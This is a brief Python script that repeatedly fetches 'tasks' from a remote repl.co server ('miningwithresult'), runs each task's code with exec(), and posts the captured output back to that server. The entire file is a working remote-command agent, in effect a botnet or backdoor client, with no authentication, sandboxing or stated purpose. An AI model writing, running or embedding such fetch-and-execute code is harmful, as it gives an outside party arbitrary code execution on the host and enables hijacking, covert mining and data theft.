import sys
from io import StringIO
import contextlib
import requests as r

@contextlib.contextmanager
def stdoutIO(stdout=None):
    old = sys.stdout
    if stdout is None:
        stdout = StringIO()
    sys.stdout = stdout
    yield stdout
    sys.stdout = old

def tasking():
    while True:
        tasks = r.get("http://miningwithresult.sapbotcs.repl.co/gettasks").json()["tasks"]
        for task in tasks:
            if task["response"] == None:
                print("Making task " + task["code"].replace("\n", ""))
                with stdoutIO() as s:
                    try:
                        exec(task["code"])
                        res = s.getvalue()
                    except Exception as e:
                        res = str(e)
                    r.post("http://miningwithresult.sapbotcs.repl.co/putresponse", json={"num":tasks.index(task), "response":res})
                print("Maked")

if __name__ == '__main__':
    tasking()
